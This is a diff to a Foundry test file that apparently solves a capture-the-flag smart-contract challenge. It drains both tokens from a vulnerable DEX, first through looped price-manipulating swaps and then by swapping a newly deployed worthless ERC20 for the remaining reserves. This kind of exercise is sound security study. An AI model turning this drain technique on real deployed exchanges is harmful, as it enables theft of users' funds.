@@ -40,29 +40,47 @@ contract DexTwoTest is Test {
     function testDrain() public {
         vm.startPrank(attacker);
 
+
+        dexTwo.approve(address(dexTwo), type(uint256).max);
         
-        attackerToken = new AttackToken("AttackerToken", "ATTK", 1000);
-        vm.label(address(attackerToken), "AttackerToken");
+        // IERC20(address(attackerToken)).transfer(address(dexTwo), 100);
+
+        
+        dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 10);
+        // console.log("Attacker Token A Balance:", swappabletokenA.balanceOf(attacker));
 
        
+        // dexTwo.swap(address(attackerToken), address(swappabletokenB), 100);
+        // console.log("Attacker Token B Balance:", swappabletokenB.balanceOf(attacker));
+
+        // Iterative draining loop
+        uint256 count;
+        while (swappabletokenA.balanceOf(address(dexTwo)) > dexTwo.getSwapAmount(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker))) {
+            console.log("Running round ", ++count, "...");
+            dexTwo.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker));
+            dexTwo.swap(address(swappabletokenA), address(swappabletokenB), swappabletokenA.balanceOf(attacker));
+        }
+
+        console.log("Outside the loop ");
+
+        dexTwo.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(address(dexTwo)));
+
+        //deploy malicious contract
+
+        attackerToken = new AttackToken("Attack", "ATK",1000);
         attackerToken.approve(address(dexTwo), type(uint256).max);
+        attackerToken.transfer(address(dexTwo),100);
+        dexTwo.swap(address(attackerToken), address(swappabletokenB), attackerToken.balanceOf(address(dexTwo)));
 
-        
-        IERC20(address(attackerToken)).transfer(address(dexTwo), 1);
+        console.log("Final Attacker Token A Balance:", swappabletokenA.balanceOf(attacker));
+        console.log("Final Attacker Token B Balance:", swappabletokenB.balanceOf(attacker));
 
-        
-        dexTwo.swap(address(attackerToken), address(swappabletokenA), 1);
-        console.log("Attacker Token A Balance:", swappabletokenA.balanceOf(attacker));
+        vm.stopPrank();
 
-       
-        dexTwo.swap(address(attackerToken), address(swappabletokenB), 1);
-        console.log("Attacker Token B Balance:", swappabletokenB.balanceOf(attacker));
-
-       
         assertEq(swappabletokenA.balanceOf(address(dexTwo)), 0, "Token A not drained");
         assertEq(swappabletokenB.balanceOf(address(dexTwo)), 0, "Token B not drained");
         
-        vm.stopPrank();
+        // vm.stopPrank();
     }
 
   
@@ -70,7 +88,6 @@ contract DexTwoTest is Test {
 
 
 contract AttackToken is ERC20 {
-    address private _dex;
 
     constructor( string memory name, string memory symbol, uint256 initialSupply)
         ERC20(name, symbol)
